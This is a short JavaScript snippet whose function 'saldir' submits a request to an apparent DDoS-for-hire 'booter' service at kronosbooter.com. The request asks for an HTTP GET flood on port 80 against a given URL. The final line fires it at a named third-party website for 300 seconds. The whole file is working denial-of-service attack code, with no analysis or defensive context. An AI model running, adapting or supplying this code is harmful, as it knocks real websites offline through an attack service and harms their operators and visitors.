
function saldir(url,time) {
	var xhr = new XMLHttpRequest();
	var params = {
		targetinput: url,
		methodselector: "jshttpget",
		postdatainput: "",
		seconds: time,
		portinput: "80",
		basiccaptcha: document.getElementsByName('basiccaptcha')[0].value
	}
	xhr.open("POST", "https://kronosbooter.com/boot.php", true);
	xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xhr.onreadystatechange = function() {
		if (xhr.readyState == 4 && xhr.status == 200) {
			xhr.close;
		}
	}
	xhr.send(deSerialize(params));
}

function deSerialize(json) {
	return Object.keys(json).map(function(key) {
		return encodeURIComponent(key) + '=' + encodeURIComponent(json[key]);
	}).join('&');
}


saldir("http://www.escort-girls.tv/",300);
